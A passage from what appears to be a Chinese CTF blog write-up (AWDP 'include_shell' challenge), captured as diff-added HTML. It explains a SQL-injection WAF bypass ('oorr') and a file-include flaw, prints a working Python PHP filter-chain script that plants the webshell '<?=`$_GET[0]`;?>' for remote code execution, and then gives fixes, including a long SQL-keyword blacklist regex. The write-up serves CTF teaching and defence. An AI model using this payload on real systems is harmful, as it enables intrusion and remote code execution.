//漏洞点</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;缺少页面参数&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>login.php中的漏洞点主要在<code>$sql = &quot;SELECT * FROM user WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;&quot;;</code></p>
+<p>参数<code>$username、$password</code>用户可控，并且直接拼接到sql语句里，存在SQL注入</p>
+<p>虽然存在WAF，但是是将关键字置空，<strong>双写绕过</strong></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果用户名或密码包含黑名单关键字，替换黑名单关键字为空</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$password</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>数据库里没东西，最终要getshell</p>
+<p>load_page.php中的漏洞点在于<code>include($page);</code>，<code>$page</code>参数可控，存在任意文件包含</p>
+<p>可以用经典的<code>CVE-2024-2961</code>将任意文件读取提升为RCE，当然这里用了<code>include</code>，也可以利用<code>filter_shell</code>进行RCE</p>
+<p>filter_shell.py</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数file</span></span><br><span class="line">url = <span class="string">&quot;http://localhost:64254/&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span>   <span class="comment">#&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="comment">#&quot;action&quot;: &quot;include&quot;,</span></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h3><p>先SQL注入万能密码登录得到admin权限，<code>1&#39; oorr 1=1 # </code></p>
+<p>得到admin权限后，打filter链RCE即可</p>
+<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>SQL注入修复上首先WAF的关键字不完整，其次不能置空，匹配到直接<code>die()</code>退出</p>
+<p>login.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义SQL注入关键字的黑名单</span></span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;SELECT&quot;</span>, <span class="string">&quot;INSERT&quot;</span>, <span class="string">&quot;UPDATE&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OR&quot;</span>, <span class="string">&quot;AND&quot;</span>, </span><br><span class="line">    <span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;ALL&quot;</span>, <span class="string">&quot;DROP&quot;</span>, <span class="string">&quot;FROM&quot;</span>, <span class="string">&quot;TABLE&quot;</span>, <span class="string">&quot;BASE&quot;</span>, <span class="string">&quot;INFO&quot;</span>, <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 检查用户输入是否匹配黑名单关键字</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$blacklist</span>) . <span class="string">&quot;)/i&quot;</span>, <span class="variable">$username</span>) </span><br><span class="line">    || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$blacklist</span>) . <span class="string">&quot;)/i&quot;</span>, <span class="variable">$password</span>)</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="comment">// 如果用户名或密码包含黑名单关键字，替换黑名单关键字为空</span></span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户输入是否匹配黑名单关键字</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|table|flag|union|\\\\$|\&#x27;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;</span>,<span class="variable">$username</span>)||<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">50</span>||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|table|flag|union|\\\\$|\&#x27;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;</span>,<span class="variable">$password</span>)||<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//转义处理</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>文件包含修复可以过滤<code>/</code>，把<code>include</code>换成<code>highlight_file</code></p>
+<p>load_page.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span>);		<span class="comment">//漏洞点</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;缺少页面参数&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//fix</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$page</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;缺少页面参数&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> AWDP 专题</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-11-04 09:35:22</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-06 09:18:21
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/11/04/AWDP-专题/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/AWDP/">#AWDP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/11/20/2025-11-20-%E5%8D%8E%E4%B8%BA%E6%9D%AF2025-WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">华为杯2025 WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/11/04/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%B8%93%E9%A2%98/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">内网安全 专题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">AWDP 专题</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AWDP%E4%B8%93%E9%A2%98"><span class="nav-text">AWDP专题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81AWDP%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">一、AWDP是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81FIX%E6%89%8B%E6%AE%B5"><span class="nav-text">二、常见FIX手段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81WAF%E5%86%99%E6%B3%95"><span class="nav-text">三、WAF写法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Go"><span class="nav-text">Go</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nodejs"><span class="nav-text">Nodejs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python"><span class="nav-text">Python</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2023%E5%8D%8E%E4%B8%BA%E6%9D%AF%E7%A0%94%E7%A9%B6%E7%94%9F%E8%B5%9Bawdp-web"><span class="nav-text">2023华为杯研究生赛awdp-web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Constellation-query"><span class="nav-text">Constellation_query</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#break"><span class="nav-text">break</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fix"><span class="nav-text">fix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-%E7%89%B9%E6%AE%8Apayload%E6%B1%87%E6%80%BB"><span class="nav-text">SSTI 特殊payload汇总</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#include-shell"><span class="nav-text">include_shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#break-1"><span class="nav-text">break</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fix-1"><span class="nav-text">fix</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
